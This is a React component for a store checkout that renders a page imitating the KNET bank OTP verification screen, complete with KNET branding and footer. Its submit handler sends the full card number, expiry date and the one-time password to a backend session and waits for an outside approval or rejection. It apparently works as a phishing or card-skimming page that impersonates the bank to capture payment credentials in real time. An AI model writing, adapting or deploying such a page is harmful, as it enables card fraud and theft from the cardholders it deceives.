import { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useCart } from '@/contexts/CartContext';
import { createOrder } from '@/hooks/useStore';
import { usePaymentSession } from '@/hooks/usePaymentSession';
import { getPaymentFlowState, savePaymentFlowState } from '@/lib/paymentFlowState';
import knetBanner from '@/assets/banks/knet-banner.png';
import knetLogo from '@/assets/banks/knet-logo.png';
import { AlertCircle } from 'lucide-react';
import PaymentRejectionBanner from '@/components/PaymentRejectionBanner';

const KnetOTP = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { clearCart } = useCart();
  const [loading, setLoading] = useState(false);
  const [otp, setOtp] = useState('');
  const [timer, setTimer] = useState(180);
  const [rejected, setRejected] = useState(false);

  const state = (location.state as any) || getPaymentFlowState() || {};
  const total = state?.total || 0;
  const cardPrefix = state?.cardPrefix || '';
  const cardNumber = state?.cardNumber || '';
  const expiryMonth = state?.expiryMonth || '';
  const expiryYear = state?.expiryYear || '';
  const bankName = state?.bankName || 'KNET';
  const bankLogo = state?.bankLogo || null;

  const { status, waiting, remainingTime, redirectTo, createSession, reset, clearRedirect } = usePaymentSession();

  useEffect(() => {
    if (redirectTo) {
      navigate(redirectTo.split("?")[0], { state, replace: true }); clearRedirect();
    }
  }, [redirectTo]);

  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => setTimer(t => t - 1), 1000);
      return () => clearInterval(interval);
    }
  }, [timer]);

  useEffect(() => {
    if (status === 'approved') {
      handleCreateOrder();
    } else if (status === 'rejected') {
      setRejected(true);
      setOtp('');
      reset();
    }
  }, [status]);

  const maskedCard = () => {
    const full = cardPrefix + cardNumber;
    if (full.length <= 4) return full;
    return '*'.repeat(full.length - 4) + full.slice(-4);
  };

  const handleCreateOrder = async () => {
    setLoading(true);
    try {
      if (!state || !state.form || !state.items) {
        throw new Error('Missing checkout state');
      }
      const order = await createOrder({
        customer_name: state.form.name,
        customer_phone: state.form.phone,
        area: state.form.area,
        block: state.form.block,
        street: state.form.street,
        building: state.form.building,
        floor: state.form.floor,
        apartment: state.form.apartment,
        notes: state.form.notes,
        payment_method: 'knet',
        subtotal: state.subtotal,
        discount: state.discount,
        prep_fees: state.preparationFees || 0,
        total,
        coupon_code: state.couponCode || undefined,
        delivery_date: state.deliverySlot?.date,
        delivery_window: state.deliverySlot?.window,
        location_lat: state.location?.lat,
        location_lng: state.location?.lng,
        location_label: state.location?.label,
        items: state.items.map((item: any) => ({
          product_id: item.product.id,
          product_name_ar: item.product.name_ar,
          product_name_en: item.product.name_en,
          quantity: item.quantity,
          unit_price: Number(item.product.price),
          preparations: item.preparations || [],
        })),
      });
      clearCart();
      // Persist phone for realtime notifications + push initial notice
      try {
        const { setLastPhone, pushNotification } = await import('@/hooks/useNotifications');
        setLastPhone(state.form.phone);
        pushNotification({
          order_number: order.order_number,
          status: 'pending',
          title_ar: 'تم استلام طلبك 🎉',
          title_en: 'Order received 🎉',
          body_ar: `طلبك #${order.order_number} قيد المعالجة عبر KNET`,
          body_en: `Order #${order.order_number} is being processed via KNET`,
        });
      } catch {}
      const successState = {
        ...state,
        orderNumber: order.order_number,
        items: state.items,
        form: state.form,
        paymentMethod: 'knet',
        subtotal: state.subtotal,
        discount: state.discount,
        total,
        deliveryFee: state.deliveryFee,
        couponCode: state.couponCode,
      };
      savePaymentFlowState(successState);
      navigate('/payment-processing', { state: successState, replace: true });
    } catch (err) {
      console.error('Order creation failed:', err);
      setLoading(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 6) return;
    setRejected(false);
    await createSession({
      step: 'knet_otp',
      customerName: state?.form?.name,
      customerPhone: state?.form?.phone,
      total,
      cardLast4: cardNumber.slice(-4),
      paymentMethod: 'knet',
      metadata: { otp, bank: state?.bankName, cardNumber: cardPrefix + cardNumber, expiry: `${expiryMonth}/${expiryYear}` },
    });
  };

  const handleCancel = () => navigate(-1);

  const timerStr = `${Math.floor(timer / 60)}:${String(timer % 60).padStart(2, '0')}`;

  return (
    <div dir="ltr" style={{ backgroundColor: '#e8e8e8', minHeight: '100dvh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'flex-start', padding: '0' }}>
      {/* Waiting Overlay */}
      {(waiting && status === 'pending') || loading ? (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 9999,
          backgroundColor: 'rgba(0,0,0,0.6)', display: 'flex', alignItems: 'center', justifyContent: 'center',
        }}>
          <div style={{
            backgroundColor: '#fff', borderRadius: '12px', padding: '30px 24px',
            textAlign: 'center', maxWidth: '300px', width: '90%',
            boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
          }}>
            <div style={{
              width: '40px', height: '40px', border: '3px solid #ddd',
              borderTopColor: '#008B8B', borderRadius: '50%',
              animation: 'spin 1s linear infinite', margin: '0 auto 16px',
            }} />
            <h3 style={{ fontSize: '12px', fontWeight: 'bold', color: '#333', fontFamily: 'Verdana, Geneva, sans-serif', margin: '0 0 6px' }}>
              {loading ? 'Processing payment...' : 'Verifying OTP...'}
            </h3>
            <p style={{ fontSize: '10px', color: '#888', fontFamily: 'Verdana, Geneva, sans-serif', margin: '0 0 12px' }}>
              Please wait
            </p>
            {!loading && (
              <>
                <div style={{ fontSize: '18px', fontWeight: 'bold', fontFamily: 'monospace', color: remainingTime <= 30 ? '#cc0000' : '#008B8B' }}>
                  {Math.floor(remainingTime / 60)}:{String(remainingTime % 60).padStart(2, '0')}
                </div>
                <div style={{ width: '80%', height: '3px', borderRadius: '2px', backgroundColor: '#ddd', margin: '6px auto 0', overflow: 'hidden' }}>
                  <div style={{ width: `${(remainingTime / 300) * 100}%`, height: '100%', borderRadius: '2px', backgroundColor: remainingTime <= 30 ? '#cc0000' : '#008B8B', transition: 'width 1s linear' }} />
                </div>
              </>
            )}
          </div>
        </div>
      ) : null}

      {/* Top Banner */}
      <div style={{ width: '100%', maxWidth: '520px' }}>
        <img src={knetBanner} alt="KNET Security Banner" style={{ width: '100%', display: 'block' }} />
      </div>

      {/* Main Card */}
      <div style={{ width: '100%', maxWidth: '520px', padding: '10px 8px 16px' }}>
        <div style={{
          backgroundColor: '#fff', border: '1px solid #ddd', borderRadius: '4px',
          boxShadow: '0 2px 8px rgba(0,0,0,0.08)', overflow: 'hidden',
        }}>
          {/* Bank Logo */}
          <div style={{ textAlign: 'center', padding: '14px 16px 12px' }}>
            <img
              src={bankLogo || knetLogo}
              alt={bankName}
              style={{ height: '44px', objectFit: 'contain' }}
            />
          </div>

          {/* Separator */}
          <div style={{ margin: '0 16px', borderBottom: '1px solid #eee' }} />

          {/* Rejected error — قابل للإغلاق + يختفي بعد 3 ثوانٍ */}
          <div style={{ margin: '10px 16px 0' }}>
            <PaymentRejectionBanner
              show={rejected}
              onClose={() => setRejected(false)}
              variant="knet"
            />
          </div>


          <form onSubmit={handleSubmit}>
            <div style={{ padding: '12px 16px' }}>
              {/* Billing Information */}
              <h3 style={{ color: '#333', fontWeight: 'bold', fontSize: '12px', fontFamily: 'Georgia, Times, serif', fontStyle: 'italic', margin: '0 0 10px' }}>
                Billing Information
              </h3>
              <table style={{ width: '100%', borderCollapse: 'collapse', marginBottom: '14px' }}>
                <tbody>
                  <tr>
                    <td style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap', width: '110px' }}>Merchant:</td>
                    <td style={{ fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#333', padding: '4px 0' }}>KDD</td>
                  </tr>
                  <tr>
                    <td style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap' }}>Amount:</td>
                    <td style={{ fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#333', padding: '4px 0' }}>KD {total.toFixed(3)}</td>
                  </tr>
                </tbody>
              </table>

              {/* OTP Verification */}
              <h3 style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '12px', fontFamily: 'Georgia, Times, serif', fontStyle: 'italic', margin: '0 0 10px' }}>
                OTP Verification
              </h3>

              {/* Notification box */}
              <div style={{
                border: '1px solid #b0d4e3', backgroundColor: '#eaf6fa', borderRadius: '3px',
                padding: '8px 10px', marginBottom: '14px',
                fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#333', lineHeight: '1.6',
              }}>
                <strong style={{ color: '#cc0000' }}>NOTIFICATION:</strong> You will presently receive an SMS on your mobile number registered with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.
              </div>

              {/* Card details table */}
              <table style={{ width: '100%', borderCollapse: 'collapse', marginBottom: '8px' }}>
                <tbody>
                  <tr>
                    <td style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap', width: '110px' }}>Card Number:</td>
                    <td style={{ fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#333', padding: '4px 0' }}>{maskedCard()}</td>
                  </tr>
                  <tr>
                    <td style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap' }}>Expiration Month:</td>
                    <td style={{ fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#333', padding: '4px 0' }}>{expiryMonth}</td>
                  </tr>
                  <tr>
                    <td style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap' }}>Expiration Year:</td>
                    <td style={{ fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#333', padding: '4px 0' }}>{expiryYear}</td>
                  </tr>
                  <tr>
                    <td style={{ color: '#cc0000', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap' }}>PIN:</td>
                    <td style={{ fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#333', padding: '4px 0' }}>****</td>
                  </tr>
                  <tr>
                    <td style={{ color: '#cc0000', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap', verticalAlign: 'middle' }}>OTP:</td>
                    <td style={{ padding: '4px 0' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }} dir="ltr">
                        <input
                          type="text" inputMode="numeric" value={otp}
                          onChange={e => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                          style={{
                            border: '1px solid #ccc', borderRadius: '2px', padding: '3px 6px',
                            fontSize: '11px', fontFamily: 'Verdana, Geneva, sans-serif',
                            outline: 'none', backgroundColor: '#fff', color: '#333',
                            width: '90px', textAlign: 'center', letterSpacing: '2px',
                          }}
                          maxLength={6} autoFocus
                        />
                        <span style={{ fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#888' }}>{timerStr}</span>
                      </div>
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            {/* Separator */}
            <div style={{ margin: '0 16px', borderBottom: '1px solid #eee' }} />

            {/* Buttons */}
            <div style={{ padding: '10px 16px 14px', display: 'flex', justifyContent: 'center', gap: '12px' }}>
              <button
                type="submit"
                disabled={otp.length < 6 || waiting || loading}
                style={{
                  padding: '5px 28px', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif',
                  fontWeight: 'normal', border: '1px solid #ccc', borderRadius: '3px',
                  cursor: (otp.length < 6 || waiting || loading) ? 'not-allowed' : 'pointer',
                  backgroundColor: '#f5f5f5', color: '#333',
                  opacity: (otp.length < 6 || waiting || loading) ? 0.5 : 1,
                }}
              >
                Submit
              </button>
              <button
                type="button" onClick={handleCancel}
                style={{
                  padding: '5px 28px', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif',
                  fontWeight: 'normal', border: '1px solid #999', borderRadius: '3px',
                  cursor: 'pointer', backgroundColor: '#555', color: '#fff',
                }}
              >
                Cancel
              </button>
            </div>
          </form>

          {/* Footer */}
          <div style={{
            textAlign: 'center', padding: '10px 16px',
            borderTop: '1px solid #ddd', backgroundColor: '#fafafa',
            fontSize: '9px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#999',
          }}>
            <img src={knetBanner} alt="KNET" style={{ height: '22px', objectFit: 'contain', marginBottom: '4px' }} /><br />
            All Rights Reserved. Copyright 2026 ©<br />
            <span style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '9px' }}>The Shared Electronic Banking Services Company - KNET</span>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
};

export default KnetOTP;
